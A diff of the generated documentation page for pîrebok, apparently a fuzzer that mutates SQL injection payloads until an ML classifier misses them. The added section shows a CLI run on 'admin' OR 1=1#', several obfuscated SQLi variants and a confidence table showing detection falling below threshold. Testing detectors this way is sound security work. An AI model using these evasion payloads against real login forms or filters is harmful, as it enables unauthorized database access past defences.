@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer" class="md-skip">
+        <a href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer-with-evolutionary-search" class="md-skip">
           Skip to content
         </a>
       
@@ -286,16 +286,38 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer" class="md-nav__link">
+  <a href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer-with-evolutionary-search" class="md-nav__link">
     <span class="md-ellipsis">
       
-        pîrebok (from Kurdish "witch") - a guided adversarial fuzzer
+        pîrebok (from Kurdish "witch") - a guided adversarial fuzzer with evolutionary search
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="pîrebok (from Kurdish &#34;witch&#34;) - a guided adversarial fuzzer">
+    <nav class="md-nav" aria-label="pîrebok (from Kurdish &#34;witch&#34;) - a guided adversarial fuzzer with evolutionary search">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How it works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#install" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Install
+      
+    </span>
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#features" class="md-nav__link">
@@ -492,16 +514,38 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer" class="md-nav__link">
+  <a href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer-with-evolutionary-search" class="md-nav__link">
     <span class="md-ellipsis">
       
-        pîrebok (from Kurdish "witch") - a guided adversarial fuzzer
+        pîrebok (from Kurdish "witch") - a guided adversarial fuzzer with evolutionary search
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="pîrebok (from Kurdish &#34;witch&#34;) - a guided adversarial fuzzer">
+    <nav class="md-nav" aria-label="pîrebok (from Kurdish &#34;witch&#34;) - a guided adversarial fuzzer with evolutionary search">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-it-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How it works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#install" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Install
+      
+    </span>
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#features" class="md-nav__link">
@@ -552,7 +596,7 @@
 
   <h1>Home</h1>
 
-<h2 id="pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer">pîrebok (from Kurdish "witch") - a guided adversarial fuzzer<a class="headerlink" href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer" title="Permanent link">&para;</a></h2>
+<h2 id="pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer-with-evolutionary-search">pîrebok (from Kurdish "witch") - a guided adversarial fuzzer with evolutionary search<a class="headerlink" href="#pîrebok-from-kurdish-witch---a-guided-adversarial-fuzzer-with-evolutionary-search" title="Permanent link">&para;</a></h2>
 <p><a href="https://pypi.org/project/pirebok/"><img alt="pypi" src="https://img.shields.io/pypi/v/pirebok.svg" /></a>
 <a href="https://pypi.org/project/pirebok/"><img alt="python" src="https://img.shields.io/pypi/pyversions/pirebok.svg" /></a>
 <a href="https://github.com/HappyHackingSpace/pirebok/actions/workflows/ci.yml"><img alt="Build Status" src="https://github.com/HappyHackingSpace/pirebok/actions/workflows/ci.yml/badge.svg" /></a>
@@ -563,11 +607,57 @@
 <li>PyPI: <a href="https://pypi.org/project/pirebok/">https://pypi.org/project/pirebok/</a></li>
 <li>Free software: MIT</li>
 </ul>
+<h3 id="how-it-works">How it works<a class="headerlink" href="#how-it-works" title="Permanent link">&para;</a></h3>
+<p>Give it a payload. It mutates it until it bypasses the classifier.</p>
+<div class="highlight"><pre><span></span><code>pirebok<span class="w"> </span>-f<span class="w"> </span>GuidedRandomSqlFuzzer<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;admin&#39; OR 1=1#&quot;</span><span class="w"> </span>-s<span class="w"> </span><span class="m">5</span><span class="w"> </span>-q
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>&quot;admin&#39; OR%001313&lt;&gt;1314#&quot;
+&#39;admin\&#39;/*%%0x9*/|| 1=1 || &quot;iD&quot; NOT LIKE &quot;iD&quot;#&#39;
+&quot;ADmIn&#39;/*&gt;SQN*//**//*h[xI*/or/*p*//**/0X1=0X1#s&lt;&quot;
+&#39;AdMin\&#39;\x0c|| &quot;b&quot;&lt;&gt;&quot;bV&quot;#;YR\x0b&#39;
+&#39;aDMin\&#39;||&quot;Mce&quot;%%231BF7%%0ALiKE%00&quot;McE&quot;#&gt;wgpxX&#39;
+</code></pre></div>
+<p>The original <code>admin' OR 1=1#</code> is classified as <strong>sqli with 100% confidence</strong>. After evolutionary mutations, the classifier misclassifies them as xss with confidence dropping to <strong>0.48</strong> - below the detection threshold.</p>
+<table>
+<thead>
+<tr>
+<th>Confidence</th>
+<th>Classification</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.0000</td>
+<td>sqli</td>
+<td><code>admin' OR 1=1#</code></td>
+</tr>
+<tr>
+<td>0.7808</td>
+<td>xss</td>
+<td><code>admin'/*PCvp&lt;a*/\|\|%000x1=0x1#i&gt;</code></td>
+</tr>
+<tr>
+<td>0.4785</td>
+<td>xss</td>
+<td><code>ADmiN'%%0x39441%%0aOr/**/'Te'&lt;&gt;'TeD'#-HLa.</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="install">Install<a class="headerlink" href="#install" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>pirebok
+
+<span class="c1"># for guided mode (requires metamaska)</span>
+pip<span class="w"> </span>install<span class="w"> </span>pirebok<span class="o">[</span>guided<span class="o">]</span>
+</code></pre></div>
 <h3 id="features">Features<a class="headerlink" href="#features" title="Permanent link">&para;</a></h3>
 <ul>
 <li>Random generic fuzzer w/ multiple transformers</li>
 <li>Random sql fuzzer w/ multiple transformers</li>
-<li>Guided random sql fuzzer w/ multiple transformers and <a href="https://github.com/HappyHackingSpace/metamaska">metamaska</a></li>
+<li>Guided random sql fuzzer w/ iterative evolutionary search and <a href="https://github.com/HappyHackingSpace/metamaska">metamaska</a></li>
+<li>Priority-queue-based payload pool ranked by confidence</li>
+<li>Configurable <code>max_rounds</code>, <code>round_size</code>, and <code>timeout</code></li>
+<li>Random comment injection transformer (<code>/**/</code> at token boundaries)</li>
 </ul>
 <h3 id="credits">Credits<a class="headerlink" href="#credits" title="Permanent link">&para;</a></h3>
 <ul>
